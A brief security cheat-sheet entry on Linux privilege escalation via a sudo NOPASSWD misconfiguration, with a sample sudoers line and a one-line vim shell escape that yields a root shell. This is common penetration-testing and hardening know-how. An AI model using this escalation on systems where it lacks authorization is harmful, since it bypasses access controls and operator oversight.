# Sudo NOPASSWD Misconfiguration

**Platform**: Linux  
**Category**: Misconfiguration  
**Technique**: Running commands as root without password

## Description

If `sudoers` grants a user the ability to run certain commands with `NOPASSWD`, and those commands can escape to a shell (like `less`, `vim`, `python`, etc.), user can escalate to an elevated shell as root.

## Requirements

- User must be allowed to run a binary without password. i.e. :

```bash
dan ALL=(ALL) NOPASSWD: /usr/bin/vim
```

## Exploitation

```bash
sudo vim -c ':!bash'
```

Escaping via vim into a shell with elevated prevleges.
